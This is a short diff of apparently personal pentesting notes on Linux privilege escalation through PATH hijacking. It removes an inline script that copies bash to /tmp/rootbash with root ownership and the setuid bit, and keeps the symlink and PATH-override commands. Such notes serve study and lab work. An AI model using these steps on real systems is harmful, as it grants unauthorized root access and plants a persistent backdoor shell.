@@ -48,15 +48,9 @@ $ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
 
 Unfortunately, this doesn't work when the command is invoked with some options, such as `tail -f /var/log/nginx/access.log`.
 
-The trick is to create a script that launches our command:
+The trick is to create a script that launches our command. Refer to [Root Bash Script](rootbash.md).
 
 ```shell!
-$ cat /tmp/root.sh
-cp /bin/bash /tmp/rootbash
-chown root /tmp/rootbash
-chmod +s /tmp/rootbash
-exit 0
-$ chmod +x /tmp/root.sh 
 $ ln -s /tmp/root.sh /tmp/xxx # your command
 $ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
 <your bash is called>
